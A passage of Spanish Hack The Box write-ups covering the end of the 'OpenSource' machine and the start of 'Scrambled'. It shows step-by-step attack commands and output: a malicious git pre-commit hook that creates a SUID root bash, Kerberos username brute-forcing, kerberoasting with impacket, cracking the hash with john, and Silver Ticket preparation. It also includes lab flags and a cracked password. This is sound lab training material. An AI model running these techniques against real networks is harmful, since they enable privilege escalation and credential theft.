IP address for docker0: 172.17.0.1 =\u0026gt; There is 1 zombie process. 16 updates can be applied immediately. 9 of these updates are standard security updates. To see these additional updates run: apt list --upgradable Last login: Mon May 16 13:13:33 2022 from 10.10.14.23 dev01@opensource:~$ ls user.txt dev01@opensource:~$ cat user.txt a60f8c63f560b461f3bf646f7453b6dd dev01@opensource:~$ Privesc Ejecutamos pspy vemos que un cron se ejecuta cada 2 minutos, generando un backup del directorio home de dev01 utilizando Git.\n1 2 3 4 5 6 7 8 9 2022/06/20 04:59:01 CMD: UID=0 PID=31815 | /bin/bash /usr/local/bin/git-sync 2022/06/20 04:59:01 CMD: UID=0 PID=31814 | /bin/sh -c /usr/local/bin/git-sync 2022/06/20 04:59:01 CMD: UID=0 PID=31813 | /usr/sbin/CRON -f 2022/06/20 04:59:01 CMD: UID=0 PID=31816 | git status --porcelain 2022/06/20 04:59:01 CMD: UID=0 PID=31817 | 2022/06/20 04:59:01 CMD: UID=0 PID=31818 | git add . 2022/06/20 04:59:01 CMD: UID=0 PID=31819 | git commit -m Backup for 2022-06-20 2022/06/20 04:59:01 CMD: UID=0 PID=31820 | git push origin main 2022/06/20 04:59:01 CMD: UID=0 PID=31821 | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git GTFOBins sugiere distintas formas para ejecutar y leer archivos, una de estas es utilizar el archivo pre-commit donde es posible escribir comandos para su ejecución, en este caso utilizamos el archivo pre-commit.sample, realizamos una copia de este y al inicio agregamos algunos comandos.\nRealizamos una copia de bash para luego darle permisos suid.\n1 2 3 4 5 6 7 8 9 10 11 12 dev01@opensource:~$ head .git/hooks/pre-commit #!/bin/sh # # An example hook script to verify what is about to be committed. # Called by \u0026#34;git commit\u0026#34; with no arguments. The hook should # exit with non-zero status after issuing an appropriate message if # it wants to stop the commit. # # To enable this hook, rename this file to \u0026#34;pre-commit\u0026#34;. cp /bin/bash /tmp/bashthis chmod u+s /tmp/bashthis dev01@opensource:~$ Despues de unos segundos esperamos a que root ejecutará git, observamos que se creó la copia de bash con permisos suid.\n1 2 3 dev01@opensource:~$ ls -lah /tmp/bashthis -rwsr-xr-x 1 root root 1.1M Jun 20 05:25 /tmp/bashthis dev01@opensource:~$ Ejecutando esta copia con la flag -p, logramos obtener la flag root.txt.\n1 2 3 4 5 6 7 8 9 dev01@opensource:~$ /tmp/bashthis -p bashthis-4.4# whoami root bashthis-4.4# cd /root bashthis-4.4# ls config\tmeta root.txt\tsnap bashthis-4.4# cat root.txt bc28cc7287b2a22362200b1c3d79b754 bashthis-4.4# ","description":"OpenSource expone el codigo fuente de una aplicación, tras analizar el codigo, descubrimos que es posible escribir y acceder a archivos localmente, con ello sobreescribimos el codigo de la aplicación para ejecutar comandos, para luego acceder a un contenedor. Dentro, descubrimos Gitea corriendo en un puerto no expuesto, obtuvimos el puerto localmente para luego descubrir una clave privada SSH que nos dió acceso a la máquina. Finalmete escalamos privilegios tras la ejecución de un cronjob como root con Git.","id":15,"section":"posts","tags":["python","flask","docker","rce","gitea","git","git-hooks"],"title":"Hack The Box - OpenSource","uri":"https://sckull.github.io/posts/opensource/"},{"content":"\rScrambled presenta información en su sitio web que nos permitió identificar unas credenciales las cuales nos ayudaron a generar un \u0026lsquo;Silver Ticket\u0026rsquo; para posteriormente acceder por MSSQL. Con las credenciales dentro de una base de datos y PowerShell accedimos a un segundo usuario. Finalmente escalamos privilegios tras descubrir y analizar una aplicación de escritorio en la que explotamos una vulnerabilidad de \u0026lsquo;Deserialization\u0026rsquo; en .NET con la ayuda de Ysoserial.NET.\nNombre Scrambled OS Windows Puntos 30 Dificultad Media IP 10.10.11.168 Maker VbScrub\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.1, 6.5, 5.4, 4.6, 3.5],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} Recon nmap nmap muestra multiples puertos abiertos: dns (53), http (80), kerberos(88), rpc (135), ldap (139), mssql (1433), (4411) y winrm (5985).\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 # Nmap 7.92 scan initiated Thu Jul 7 13:51:25 2022 as: nmap -p53,80,88,135,139,389,445,464,593,636,1433,3268,3269,4411,5985,9389,49673,49674,49698,59041 -sV -sC -oN nmap_scan 10.10.11.168 Nmap scan report for 10.10.11.168 (10.10.11.168) Host is up (0.26s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Scramble Corp Intranet | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-07-07 17:51:32Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T15:30:57 |_Not valid after: 2023-06-09T15:30:57 |_ssl-date: 2022-07-07T17:54:43+00:00; -1s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T15:30:57 |_Not valid after: 2023-06-09T15:30:57 |_ssl-date: 2022-07-07T17:54:43+00:00; -1s from scanner time. 1433/tcp open ms-sql-s Microsoft SQL Server 2019 15.00.2000.00; RTM |_ssl-date: 2022-07-07T17:54:43+00:00; -1s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2022-07-07T13:39:00 |_Not valid after: 2052-07-07T13:39:00 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) |_ssl-date: 2022-07-07T17:54:43+00:00; -2s from scanner time. | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T15:30:57 |_Not valid after: 2023-06-09T15:30:57 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: scrm.local0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=DC1.scrm.local | Subject Alternative Name: othername:\u0026lt;unsupported\u0026gt;, DNS:DC1.scrm.local | Not valid before: 2022-06-09T15:30:57 |_Not valid after: 2023-06-09T15:30:57 |_ssl-date: 2022-07-07T17:54:43+00:00; -1s from scanner time. 4411/tcp open found? | fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, GenericLines, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, NCP, NULL, NotesRPC, RPCCheck, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: | SCRAMBLECORP_ORDERS_V1.0.3; | FourOhFourRequest, GetRequest, HTTPOptions, Help, LPDString, RTSPRequest, SIPOptions: | SCRAMBLECORP_ORDERS_V1.0.3; |_ ERROR_UNKNOWN_COMMAND; 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 59041/tcp open msrpc Microsoft Windows RPC 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port4411-TCP:V=7.92%I=7%D=7/7%Time=62C71D25%P=x86_64-pc-linux-gnu%r(NUL SF:L,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(GenericLines,1D,\u0026#34;SCRAMBLECO SF:RP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(GetRequest,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3 SF:;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(HTTPOptions,35,\u0026#34;SCRAMBLECORP_ORDERS SF:_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(RTSPRequest,35,\u0026#34;SCRAMBLECO SF:RP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(RPCCheck,1D,\u0026#34;SCRA SF:MBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(DNSVersionBindReqTCP,1D,\u0026#34;SCRAMBLECORP SF:_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(DNSStatusRequestTCP,1D,\u0026#34;SCRAMBLECORP_ORDERS_V SF:1\\.0\\.3;\\r\\n\u0026#34;)%r(Help,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOW SF:N_COMMAND;\\r\\n\u0026#34;)%r(SSLSessionReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34; SF:)%r(TerminalServerCookie,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(TLSS SF:essionReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(Kerberos,1D,\u0026#34;SCRAMB SF:LECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(SMBProgNeg,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\. SF:0\\.3;\\r\\n\u0026#34;)%r(X11Probe,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(FourOh SF:FourRequest,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND; SF:\\r\\n\u0026#34;)%r(LPDString,35,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_C SF:OMMAND;\\r\\n\u0026#34;)%r(LDAPSearchReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r SF:(LDAPBindReq,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(SIPOptions,35,\u0026#34;S SF:CRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\nERROR_UNKNOWN_COMMAND;\\r\\n\u0026#34;)%r(LANDesk- SF:RC,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(TerminalServer,1D,\u0026#34;SCRAMBL SF:ECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(NCP,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\ SF:n\u0026#34;)%r(NotesRPC,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(JavaRMI,1D,\u0026#34;SC SF:RAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(WMSRequest,1D,\u0026#34;SCRAMBLECORP_ORDERS_ SF:V1\\.0\\.3;\\r\\n\u0026#34;)%r(oracle-tns,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r( SF:ms-sql-s,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(afp,1D,\u0026#34;SCRAMBLECORP SF:_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;)%r(giop,1D,\u0026#34;SCRAMBLECORP_ORDERS_V1\\.0\\.3;\\r\\n\u0026#34;); Service Info: Host: DC1; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required |_clock-skew: mean: -1s, deviation: 0s, median: -1s | smb2-time: | date: 2022-07-07T17:54:05 |_ start_date: N/A | ms-sql-info: | 10.10.11.168:1433: | Version: | name: Microsoft SQL Server 2019 RTM | number: 15.00.2000.00 | Product: Microsoft SQL Server 2019 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Jul 7 13:54:47 2022 -- 1 IP address (1 host up) scanned in 201.75 seconds Kerbrute Mientras analizamos la información del sitio web ejecutamos kerbrute para enumerar usuarios, observamos siete usuarios válidos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 π ~/htb/scrambled ❯ /opt/kerbrute userenum -t 100 -d scrm.local --dc 10.10.11.168 xato-net-10-million-usernames-dup.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 07/15/22 - Ronnie Flathers @ropnop 2022/07/15 19:49:01 \u0026gt; Using KDC(s): 2022/07/15 19:49:01 \u0026gt; 10.10.11.168:88 2022/07/15 19:49:06 \u0026gt; [+] VALID USERNAME: administrator@scrm.local 2022/07/15 19:49:18 \u0026gt; [+] VALID USERNAME: asmith@scrm.local 2022/07/15 19:49:34 \u0026gt; [+] VALID USERNAME: Administrator@scrm.local 2022/07/15 19:49:45 \u0026gt; [+] VALID USERNAME: jhall@scrm.local 2022/07/15 19:51:36 \u0026gt; [+] VALID USERNAME: sjenkins@scrm.local 2022/07/15 19:51:53 \u0026gt; [+] VALID USERNAME: khicks@scrm.local 2022/07/15 19:53:36 \u0026gt; [+] VALID USERNAME: Asmith@scrm.local 2022/07/15 19:56:59 \u0026gt; [+] VALID USERNAME: ASMITH@scrm.local 2022/07/15 19:57:46 \u0026gt; [+] VALID USERNAME: tstar@scrm.local 2022/07/15 20:12:51 \u0026gt; Done! Tested 624370 usernames (9 valid) in 1429.221 seconds π ~/htb/scrambled ❯ Web Site Los headers del sitio muestran Microsfot IIS 10.0.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/scrambled ❯ curl -sI 10.10.11.168 HTTP/1.1 200 OK Content-Length: 2313 Content-Type: text/html Last-Modified: Thu, 04 Nov 2021 18:13:14 GMT Accept-Ranges: bytes ETag: \u0026#34;3aed29a2a7d1d71:0\u0026#34; Server: Microsoft-IIS/10.0 Date: Fri, 15 Jul 2022 23:32:34 GMT π ~/htb/scrambled ❯ Se presenta al sitio web como parte de una Intranet.\nIT Services muestra distintas paginas, en esta se destaca la alerta que indica que auntenticación por NTLM está descativada.\nContact IT Support, muestra información de contacto, se muestran dos posibles nombres de usuarios: support y ksimpson.\nNew User Account muestra un formulario de \u0026ldquo;registro\u0026rdquo;, pero no es enviado a ninguna ruta.\nSales Orders App Troubleshooting, muestra una aplicación de escritorio, observamos la dirección del servidor y puerto, este ultimo está presente en nmap.\nPassword Resets, muestra información de cambio de contraseña, indica que al realizar un reset de contraseña es posible usar el usuario como contraseña.\nTras ejecutar nuevamente kerbrute esta vez con los dos usuarios, se muestra unicamente ksimpson como válido.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 π ~/htb/scrambled ❯ /opt/kerbrute userenum -t 100 -d scrm.local --dc 10.10.11.168 users.txt __ __ __ / /_____ _____/ /_ _______ __/ /____ / //_/ _ \\/ ___/ __ \\/ ___/ / / / __/ _ \\ / ,\u0026lt; / __/ / / /_/ / / / /_/ / /_/ __/ /_/|_|\\___/_/ /_.___/_/ \\__,_/\\__/\\___/ Version: v1.0.3 (9dad6e1) - 07/15/22 - Ronnie Flathers @ropnop 2022/07/15 20:19:33 \u0026gt; Using KDC(s): 2022/07/15 20:19:33 \u0026gt; 10.10.11.168:88 2022/07/15 20:19:33 \u0026gt; [+] VALID USERNAME: ksimpson@scrm.local 2022/07/15 20:19:33 \u0026gt; Done! Tested 2 usernames (1 valid) in 0.068 seconds π ~/htb/scrambled ❯ User - SQLsvc Kerberos Authentication Tal y como lo indicaba el sitio, es posible utilizar el usuario como contraseña, en este caso observamos que el usuario ksimpson es válido en kerberos.\n1 2 3 4 5 6 7 π ~/htb/scrambled ❯ /opt/kerbrute bruteuser --dc 10.10.11.168 -d scrm.local users.txt ksimpson [.. snip ..] 2022/07/15 20:19:46 \u0026gt; [+] VALID LOGIN: ksimpson@scrm.local:ksimpson 2022/07/15 20:19:46 \u0026gt; Done! Tested 3 logins (1 successes) in 0.399 seconds π ~/htb/scrambled ❯ WADComs es un sitio que muestra distintos comandos para enumeración o explotación en entornos Windows segun la información que tengamos. Uno de ellos es GetUserSPNs de impacket. Sin embargo tras ejecutar el script observamos un error.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 π ~/htb/scrambled ❯ impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 -request -debug Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [+] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket [+] Connecting to 10.10.11.168, port 389, SSL False Traceback (most recent call last): File \u0026#34;/usr/share/doc/python3-impacket/examples/GetUserSPNs.py\u0026#34;, line 510, in \u0026lt;module\u0026gt; executer.run() File \u0026#34;/usr/share/doc/python3-impacket/examples/GetUserSPNs.py\u0026#34;, line 271, in run ldapConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash) File \u0026#34;/usr/lib/python3/dist-packages/impacket/ldap/ldap.py\u0026#34;, line 336, in login type3, exportedSessionKey = getNTLMSSPType3(negotiate, bytes(type2), user, password, domain, lmhash, nthash) File \u0026#34;/usr/lib/python3/dist-packages/impacket/ntlm.py\u0026#34;, line 621, in getNTLMSSPType3 ntlmChallenge = NTLMAuthChallenge(type2) File \u0026#34;/usr/lib/python3/dist-packages/impacket/structure.py\u0026#34;, line 87, in __init__ self.fromString(data) File \u0026#34;/usr/lib/python3/dist-packages/impacket/ntlm.py\u0026#34;, line 379, in fromString Structure.fromString(self,data) File \u0026#34;/usr/lib/python3/dist-packages/impacket/structure.py\u0026#34;, line 152, in fromString self[field[0]] = self.unpack(field[1], data[:size], dataClassOrCode = dataClassOrCode, field = field[0]) File \u0026#34;/usr/lib/python3/dist-packages/impacket/structure.py\u0026#34;, line 315, in unpack raise Exception(\u0026#34;Unpacked data doesn\u0026#39;t match constant value \u0026#39;%r\u0026#39; should be \u0026#39;%r\u0026#39;\u0026#34; % (data, answer)) Exception: (\u0026#34;Unpacked data doesn\u0026#39;t match constant value \u0026#39;b\u0026#39;\u0026#39;\u0026#39; should be \u0026#39;\u0026#39;NTLMSSP\\\\x00\u0026#39;\u0026#39;\u0026#34;, \u0026#39;When unpacking field \\\u0026#39; | \u0026#34;NTLMSSP\\x00 | b\\\u0026#39;\\\u0026#39;[:8]\\\u0026#39;\u0026#39;) [-] (\u0026#34;Unpacked data doesn\u0026#39;t match constant value \u0026#39;b\u0026#39;\u0026#39;\u0026#39; should be \u0026#39;\u0026#39;NTLMSSP\\\\x00\u0026#39;\u0026#39;\u0026#34;, \u0026#39;When unpacking field \\\u0026#39; | \u0026#34;NTLMSSP\\x00 | b\\\u0026#39;\\\u0026#39;[:8]\\\u0026#39;\u0026#39;) π ~/htb/scrambled ❯ El error nos lleva al repositorio de impacket donde se habla que la autenticación por NTLM está desactivada (la alerta del sitio lo menciona) y es necesario utilizar autenticación por kerberos. Se menciona una solución y un pull request con la solución aplicada en tres scripts de impacket (GetADUsers.py, GetNPUsers.py, GetUserSPNs.py ver commit), hay que mencionar que la solución es presentada por el autor de la máquina.\nTicket - Kerberos Para autenticarnos por kerberos necesitamos un ticket, solicitamos un ticket utilizando getTGT de impacket para el usuario ksimpson.\n1 2 3 4 5 6 7 8 9 10 π ~/htb/scrambled ❯ impacket-getTGT scrm.local/ksimpson:ksimpson -dc-ip 10.10.11.168 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Saving ticket in ksimpson.ccache π ~/htb/scrambled ❯ file ksimpson.ccache ksimpson.ccache: data π ~/htb/scrambled ❯ export KRB5CCNAME=`pwd`/ksimpson.ccache π ~/htb/scrambled ❯ echo $KRB5CCNAME /home/kali/htb/scrambled/ksimpson.ccache π ~/htb/scrambled ❯ Clonamos el repositorio de impacket con la solución, en este caso en la rama \u0026lsquo;add-dc-host-option\u0026rsquo;.\n1 2 3 4 5 6 7 π ~/htb/scrambled ❯ git clone -b add-dc-host-option https://github.com/rmaksimov/impacket.git Cloning into \u0026#39;impacket\u0026#39;... remote: Enumerating objects: 21256, done. remote: Total 21256 (delta 0), reused 0 (delta 0), pack-reused 21256 Receiving objects: 100% (21256/21256), 7.35 MiB | 1.12 MiB/s, done. Resolving deltas: 100% (16226/16226), done. π ~/htb/scrambled ❯ Ejecutamos GetUserSPNs utilizando autenticación por kerberos, observamos el hash del usuario sqlsvc.\n1 2 3 4 5 6 7 8 9 10 11 12 π ~/htb/scrambled ❯ impacket/examples/GetUserSPNs.py scrm.local/ksimpson -k -no-pass -request -dc-ip 10.10.11.168 -dc-host dc1.scrm.local Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation ServicePrincipalName Name MemberOf PasswordLastSet LastLogon Delegation ---------------------------- ------ -------- -------------------------- -------------------------- ---------- MSSQLSvc/dc1.scrm.local:1433 sqlsvc 2021-11-03 12:32:02.351452 2022-07-15 00:56:52.273402 MSSQLSvc/dc1.scrm.local sqlsvc 2021-11-03 12:32:02.351452 2022-07-15 00:56:52.273402 $krb5tgs$23$*sqlsvc$SCRM.LOCAL$MSSQLSvc/dc1.scrm.local*$67b545c8a8b581039ec835bba9d27e5b$3b302f3739382078a3c1cf29c27b7e8a9a2a349860479344247f31be9783b9dea6f2560c1c0992f720c44dc69e7fdf0d5ed6ea6d8a38a5ac0f32d372ff168c3f00c504ccaf0224c45dc4d74481255ed9655502d820adf323a3a2b46172b68b75a0a88b7f572db286c7faa26b87176f446862eabf88d6bbe3e6ca6382c4277f1d212e7d72253964e3b9bfb14486c3015a6b5caf760cf964343c855a39ab88647cccedf71bd78718c13b6cb46a39dd6b4af69503a77b7830cd2c3bb8b7c878d802617211dc0ed5a03aed141b2a37acc31b951a446a23f2df45cf452fcb5794ca71fec3a3d3a96470ec1d1943b3ba8ebb7fffdf5abeec762c458d0f81f868e4d8d141009ab58520c28b328865ca2600984fc34590190ce08573372749e0746ce1e6b9bf015721d8570dd95718e8befbce3657fdce675371b2b6c8bd577bcb68389e43c7d317fe1194a7a8129ef20175dbf995106d5ee32db3c101adaa270b37d7b57e5b5a25be04ba4b5232f05612bedbfc48866ddcb5209d670adfc582b39bfcb707eff1a8712d907486fe858922428e433b2f62de29507c2b18c0b40a405662a1fa688bf635fae0d48302d4c8e67c45da5d9cd51ea52e4ff63e400b70e702c7aaec5a1878d498c7cbf29d404b1c648f0a4233594d1fe9c1b7270048668078e4762feccd4c24d1b41f1e281beac895c52f001ac2f98abd7da70349c77a8612d860484f9a9e9690efb359ba7ce22974651fe666d81191a6a12ca876bc7ab248a07dd8c21ea4d46f22c2649fdaad1ef1a8378937e27e824df468f97bd3f6a97cacc7354d62d4256f31234622dc6202a9a180cb7c15d480f30a622742159b833e4969d8c335f691f0087d62118200985dc0e48462a8a2656a9dbd66e4fcfc0048e5e8bd8a534dee2049204e992205b21dd7e2d92a4ece7a8c8d7713aeb0d20d4ba8821ff2a2f1dca02c70ad6d7541b03e3157b21f3cbd2606eae1d49c064b5aef928b7f561f44017162b846131abe6e47037bd2e0f438264de3a8fa2813c3c5eba5770f5bb4f31b04cd931077d07f80d7ab6b7694897aabd247bd09e7ca844ffa594d8d3def655917b311908ac40e879c876b23717c033a0613fee0d30ab354ada1e199d1912f8da9005d3c823df808664bc4a274aac0e6d1a193aabb43fc7be817bfcd61cdd929246d71e16f4b46b2fc69862c70bf0c31c51e2a4cf4f5563c3cc5e1e8ddcc7b72b6a4c4a7ef5dcedcd0cf35c41799bd70b596de5eef28b0cc5b0e1854871971fd2af1ede3ae034611c002f9bf567ebf063d3d95a87c245878aff287acde26b5a66ab28e0a53803314bc81b55032570a31b957f2867370cc79cac365e467b08bb3c7ef197e57600728b343b5a4e4158d15bd0be1e676b50f715ddc6d0e3baccee0dc8a2ffc0468737cb791084452a6763a9d66f9239ab6 π ~/htb/scrambled ❯ Password Hash Cracking Tras ejecutar john con el wordlist rockyou obtuvimos la contraseña.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/scrambled ❯ john --wordlist=$ROCK sqlsvc_hash Created directory: /home/kali/.john Using default input encoding: UTF-8 Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4]) Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status Pegasus60 (?) 1g 0:00:00:05 DONE (2022-07-15 20:28) 0.1773g/s 1902Kp/s 1902Kc/s 1902KC/s Penrose..Pearce Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. π ~/htb/scrambled ❯ Intentamos autenticarnos por kerberos por mssql solicitando un ticket pero mssql no nos permite.\n1 2 3 4 5 6 7 8 9 10 11 π ~/htb/scrambled ❯ impacket-getTGT scrm.local/sqlsvc:Pegasus60 -dc-ip 10.10.11.168 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Saving ticket in sqlsvc.ccache π ~/htb/scrambled ❯ export KRB5CCNAME=`pwd`/sqlsvc.ccache π ~/htb/scrambled ❯ impacket/examples/mssqlclient.py dc1.scrm.local/sqlsvc@10.10.11.168 -k -no-pass Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Encryption required, switching to TLS [-] Kerberos SessionError: KDC_ERR_WRONG_REALM(Reserved for future use) π ~/htb/scrambled ❯ Silver Ticket Luego de investigar un poco más nos topamos con Silver Tickets, con la información que tenemos podemos craftear un ticket para un servicio. Para ello necesitamos obtener el NTLM hash y SID de un usuario.\nPara obtener el SID, lookupsid de impacket podría ayudarnos, pero lookupsid no soporta autenticación por kerberos.\n1 2 3 4 5 6 7 π ~/htb/scrambled ❯ impacket-lookupsid scrm.lcoal/ksimpson:ksimpson@dc1.scrm.local Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Brute forcing SIDs at dc1.scrm.local [*] StringBinding ncacn_np:dc1.scrm.local[\\pipe\\lsarpc] [-] SMB SessionError: STATUS_NOT_SUPPORTED(The request is not supported.) π ~/htb/scrambled ❯ VbScrub en el video sobre Silver Tickets presenta GetDomainSID.exe, una herramienta para obtener los SID de un dominio, especificando las credenciales, tambien es posible obtener por medio de autenticación kerberos, se presenta el query utilizado por este programa en LDAP.\n1 (\u0026amp;(ObjectClass=user)(objectSid=*)(!(ObjectClass=foreignSecurityPrincipal))) Utilizando el query anterior modificamos el script GetADUsers de impacket para obtener los SID de los usuarios en el dominio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 π ~/htb/scrambled ❯ ./sidkerberos.py scrm.local/ksimpson -k -no-pass -dc-ip 10.10.11.168 -dc-host dc1.scrm.local -all Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation [*] Querying dc1.scrm.local for information about domain. Name SID -------------------- ------------------------------ administrator S-1-5-21-2743207045-1827831105-2542523200-500 Guest 